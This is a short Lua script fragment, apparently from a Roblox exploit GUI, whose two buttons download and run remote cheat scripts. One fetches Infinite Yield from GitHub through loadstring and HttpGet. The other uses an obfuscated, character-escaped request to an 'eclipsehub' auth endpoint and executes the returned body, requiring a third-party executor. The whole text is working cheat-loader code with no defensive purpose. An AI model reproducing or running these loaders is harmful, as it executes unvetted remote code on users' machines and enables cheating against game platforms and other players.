		-- Scripts:
	
		local function QTNKOS_fake_script() -- InfYieldButton.LocalScript 
			local script = Instance.new('LocalScript', InfYieldButton)
	
			local thisbutton = script.Parent
			thisbutton.MouseButton1Click:Connect(function()
				loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
			end)
		end
		coroutine.wrap(QTNKOS_fake_script)()
		local function AHDHRDW_fake_script() -- MM2Button.MM2Script 
			local script = Instance.new('LocalScript', MM2Button)
	
			local mm2 = script.Parent
			mm2.MouseButton1Click:Connect(function()
				getgenv().mainKey = "nil"
				local a,b,c,d,e=loadstring,request or http_request or (http and http.request) or (syn and syn.request),assert,tostring,"https\58//api.eclipsehub.xyz/auth";c(a and b,"Executor not Supported")a(b({Url=e.."\?\107e\121\61"..d(mainKey),Headers={["User-Agent"]="Eclipse"}}).Body)()
			end)
		end
		coroutine.wrap(AHDHRDW_fake_script)()
